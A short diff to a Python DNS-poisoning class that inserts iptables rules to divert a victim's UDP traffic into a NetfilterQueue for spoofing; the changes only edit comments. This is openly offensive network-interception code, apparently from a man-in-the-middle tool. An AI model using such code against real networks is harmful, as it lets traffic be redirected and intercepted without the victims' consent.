@@ -10,10 +10,10 @@ class DnsPoisoner(multiprocessing.Process):
         multiprocessing.Process.__init__(self)
 
         self.urls_to_spoof = {}
-        self.queue         = NetfilterQueue()    
+        self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
         #Create rules on how to handles packets destined for your LAN
-        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue
-        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get removed from LAN
+        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
+        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #Restores original ip rule
         self.exit          = False
 
         #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
